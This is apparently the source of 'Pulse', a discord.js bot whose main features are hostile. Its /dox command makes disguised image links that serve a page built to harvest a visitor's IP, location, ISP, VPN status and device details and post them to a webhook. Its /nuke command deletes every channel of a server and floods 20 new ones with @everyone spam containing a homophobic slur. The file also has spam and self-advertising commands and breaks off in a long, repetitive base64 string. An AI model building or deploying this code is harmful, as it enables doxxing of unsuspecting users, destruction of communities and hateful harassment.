const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, ChannelType } = require('discord.js');
const crypto = require('crypto');
const express = require('express');
const app = express();

const TOKEN = process.env.TOKEN;
const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
const PORT = process.env.PORT || 3000;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages
    ]
});

const links = new Map();
const startTime = Date.now();
let nukeRunning = false;
let nukeGuildId = null;

app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    if (!links.has(id)) return res.status(404).send('Image not found');
    const data = links.get(id);
    res.type('text/html');
    res.send(generateDoxHTML(data.webhook || DEFAULT_WEBHOOK));
});

app.get('/', (req, res) => {
    res.send('Pulse bot is alive 🚀');
});

app.listen(PORT, () => console.log(`Dox server on ${PORT}`));

async function registerCommands() {
    const commands = [
        { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
        { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms', required: false }] },
        { name: 'nuke', description: 'Delete all channels, create 20, spam 100 messages each, leave' },
        { name: 'stop', description: 'Stop the nuke' },
        { name: 'ad', description: 'Advertise the server invite' },
        { name: 'purge', description: 'Delete messages in bulk', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
        { name: 'ping', description: 'Check bot latency' },
        { name: 'serverinfo', description: 'Get server information' },
        { name: 'userinfo', description: 'Get user information', options: [{ name: 'user', type: 6, description: 'Target user', required: false }] },
        { name: 'avatar', description: 'Show user avatar', options: [{ name: 'user', type: 6, description: 'Target user', required: false }] },
        { name: 'math', description: 'Calculate a math expression', options: [{ name: 'expression', type: 3, description: 'Math expression', required: true }] },
        { name: 'say', description: 'Make bot say something', options: [{ name: 'message', type: 3, description: 'Message to say', required: true }] },
        { name: '8ball', description: 'Ask the magic 8-ball a question', options: [{ name: 'question', type: 3, description: 'Your question', required: true }] },
        { name: 'roll', description: 'Roll a dice', options: [{ name: 'sides', type: 4, description: 'Number of sides (default 6)', required: false }] }
    ];
    try {
        await client.application.commands.set([]);
        console.log('[REG] Cleared old commands.');
        await client.application.commands.set(commands);
        console.log(`[REG] Registered ${commands.length} commands.`);
    } catch (error) {
        console.error('[REG] Failed:', error);
    }
}

client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag}`);
    await registerCommands();
    console.log('Ready.');
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    try {
        await interaction.deferReply({ ephemeral: true });
    } catch {
        try {
            await interaction.reply({ content: '⏳ Processing...', ephemeral: true });
        } catch {
            return;
        }
    }

    try {
        const { commandName, options, user, member, guild, channel } = interaction;
        console.log(`[${new Date().toISOString()}] ${user.tag} -> /${commandName}`);

        // ---- STOP ----
        if (commandName === 'stop') {
            if (!nukeRunning) {
                return interaction.editReply('❌ No nuke is currently running.');
            }
            nukeRunning = false;
            nukeGuildId = null;
            await interaction.editReply('⏹️ **Nuke stopped.**');
            return;
        }

        // ---- DOX ----
        if (commandName === 'dox') {
            const wh = options.getString('webhook');
            if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) {
                return interaction.editReply('❌ Invalid webhook URL.');
            }
            const id = crypto.randomBytes(6).toString('hex');
            const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
            links.set(id, { webhook: wh, user: user.tag, created: Date.now() });
            const embed = new EmbedBuilder()
                .setTitle('✅ Dox Link Ready')
                .setColor(0x22c55e)
                .setDescription(`🔗 **${url}**\n\nSends IP, location, ISP, ASN, battery, VPN detection, and device info.`)
                .setFooter({ text: `Generated by ${user.tag}` });
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- SPAM ----
        if (commandName === 'spam') {
            const count = Math.min(options.getInteger('count'), 100);
            const msg = options.getString('message');
            const delay = options.getInteger('delay') || 0;
            if (!channel) return interaction.editReply('❌ No channel.');
            for (let i = 0; i < count; i++) {
                await channel.send(msg);
                if (delay > 0) await new Promise(r => setTimeout(r, delay));
            }
            await interaction.editReply(`✅ Spammed ${count} messages.`);
            return;
        }

        // ---- NUKE (Fixed) ----
        if (commandName === 'nuke') {
            if (nukeRunning) {
                return interaction.editReply('❌ A nuke is already running. Use `/stop` to stop it first.');
            }

            if (!guild) return interaction.editReply('❌ Server only.');
            if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.editReply('❌ Need Admin.');

            nukeRunning = true;
            nukeGuildId = guild.id;

            await interaction.editReply('🚀 **Nuke started!** Use `/stop` to stop it.');

            // Delete all channels
            await Promise.all(guild.channels.cache.map(c => c.delete().catch(() => {})));

            // Create 20 new channels
            const newChannels = await Promise.all(
                Array.from({ length: 20 }, () =>
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)
                )
            );
            const valid = newChannels.filter(c => c !== null);

            // Build the spam message
            const variants = ['# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'];
            const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
            const line = variants[0];
            let big = `@everyone ${line}\n`;
            while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) big += line + '\n';
            big += `\n${inviteLine}`;
            const spamMessage = big.slice(0, 2000);

            // Send 100 messages to each channel
            for (let i = 0; i < 100; i++) {
                if (!nukeRunning) break;
                await Promise.all(valid.map(c => c.send(spamMessage).catch(() => {})));
                await new Promise(r => setTimeout(r, 50)); // small delay to avoid rate limit
            }

            // Leave the server
            await guild.leave();

            nukeRunning = false;
            await interaction.editReply('✅ **Nuke complete.** Left the server.');
            return;
        }

        // ---- AD ----
        if (commandName === 'ad') {
            if (!channel) return interaction.editReply('❌ No channel.');
            const embed = new EmbedBuilder()
                .setTitle('🔥 Pulse Nuke Power')
                .setColor(0x8B5CF6)
                .setDescription(`Join Pulse:\n${INVITE_LINK}`)
                .setFooter({ text: 'Pulse Bot' });
            await channel.send({ embeds: [embed] });
            await interaction.editReply('✅ Ad sent.');
            return;
        }

        // ---- PURGE ----
        if (commandName === 'purge') {
            const amount = Math.min(options.getInteger('amount'), 100);
            const targetUser = options.getUser('user');
            const reason = options.getString('reason') || 'No reason';
            if (!channel) return interaction.editReply('❌ No channel.');
            if (!channel.permissionsFor(member).has(PermissionsBitField.Flags.ManageMessages)) return interaction.editReply('❌ Need Manage Messages.');
            let messages = await channel.messages.fetch({ limit: amount });
            if (targetUser) messages = messages.filter(m => m.author.id === targetUser.id);
            const deleted = await channel.bulkDelete(messages, true).catch(() => {});
            const embed = new EmbedBuilder()
                .setTitle('🧹 Purge Complete')
                .setColor(0x22c55e)
                .setDescription(`Deleted ${deleted ? deleted.size : 0} messages.`)
                .addFields({ name: 'Reason', value: reason });
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- PING ----
        if (commandName === 'ping') {
            const sent = await interaction.editReply({ content: '🏓 Pinging...', fetchReply: true });
            const latency = sent.createdTimestamp - interaction.createdTimestamp;
            await interaction.editReply(`🏓 Pong!\n📨 Latency: ${latency}ms\n📡 API: ${Math.round(client.ws.ping)}ms`);
            return;
        }

        // ---- SERVERINFO ----
        if (commandName === 'serverinfo') {
            if (!guild) return interaction.editReply('❌ Server only.');
            const owner = await guild.fetchOwner();
            const embed = new EmbedBuilder()
                .setTitle(`📊 ${guild.name}`)
                .setColor(0x8B5CF6)
                .setThumbnail(guild.iconURL({ dynamic: true, size: 256 }))
                .addFields(
                    { name: '🆔 Server ID', value: guild.id, inline: true },
                    { name: '👑 Owner', value: owner.user.tag, inline: true },
                    { name: '👥 Members', value: `${guild.memberCount}`, inline: true },
                    { name: '💬 Channels', value: `${guild.channels.cache.size}`, inline: true },
                    { name: '📁 Roles', value: `${guild.roles.cache.size}`, inline: true },
                    { name: '📅 Created', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true }
                );
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- USERINFO ----
        if (commandName === 'userinfo') {
            const target = options.getUser('user') || user;
            const memberTarget = guild ? await guild.members.fetch(target.id).catch(() => null) : null;
            const embed = new EmbedBuilder()
                .setTitle(`👤 ${target.tag}`)
                .setColor(0x8B5CF6)
                .setThumbnail(target.displayAvatarURL({ dynamic: true, size: 256 }))
                .addFields(
                    { name: '🆔 User ID', value: target.id, inline: true },
                    { name: '📅 Account Created', value: `<t:${Math.floor(target.createdTimestamp / 1000)}:R>`, inline: true },
                    { name: '🤖 Bot', value: target.bot ? 'Yes' : 'No', inline: true }
                );
            if (memberTarget) {
                embed.addFields(
                    { name: '📅 Joined Server', value: `<t:${Math.floor(memberTarget.joinedTimestamp / 1000)}:R>`, inline: true },
                    { name: '📊 Roles', value: memberTarget.roles.cache.map(r => r.toString()).join(', ') || 'None' }
                );
            }
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- AVATAR ----
        if (commandName === 'avatar') {
            const target = options.getUser('user') || user;
            const embed = new EmbedBuilder()
                .setTitle(`${target.tag}'s Avatar`)
                .setImage(target.displayAvatarURL({ dynamic: true, size: 1024 }))
                .setColor(0x8B5CF6);
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- MATH ----
        if (commandName === 'math') {
            const expr = options.getString('expression');
            try {
                const sanitized = expr.replace(/[^0-9+\-*/().% ]/g, '');
                if (!sanitized) return interaction.editReply('❌ Invalid expression.');
                const result = Function(`"use strict"; return (${sanitized})`)();
                await interaction.editReply(`🧮 **${expr}** = **${result}**`);
            } catch (e) {
                await interaction.editReply(`❌ Error: ${e.message}`);
            }
            return;
        }

        // ---- SAY ----
        if (commandName === 'say') {
            const msg = options.getString('message');
            if (!channel) return interaction.editReply('❌ No channel.');
            await channel.send(msg);
            await interaction.editReply('✅ Sent.');
            return;
        }

        // ---- 8BALL ----
        if (commandName === '8ball') {
            const responses = ['Yes', 'No', 'Maybe', 'Ask again later', 'Definitely', 'Absolutely not', 'It is certain', 'Very doubtful'];
            const answer = responses[Math.floor(Math.random() * responses.length)];
            const q = options.getString('question');
            const embed = new EmbedBuilder()
                .setTitle('🎱 8-Ball')
                .setDescription(`**Question:** ${q}\n**Answer:** ${answer}`)
                .setColor(0x8B5CF6);
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- ROLL ----
        if (commandName === 'roll') {
            const sides = options.getInteger('sides') || 6;
            const result = Math.floor(Math.random() * sides) + 1;
            await interaction.editReply(`🎲 Rolled a d${sides}: **${result}**`);
            return;
        }

    } catch (error) {
        console.error('[ERROR]', error);
        try { await interaction.editReply(`❌ Error: ${error.message}`); } catch {}
    }
});

// ---- DOX HTML ----
function generateDoxHTML(webhook) {
    const catBase64 = 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgICAgJCAkKCgkNDQ0NDRgODQ0NDRoTEhMSEhM0GxgXGxgXGzQkISUkJCEkNDQ1NTQ0N0dHR0dHR0dHR0dHR0f/wAALCAEAAgAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAR
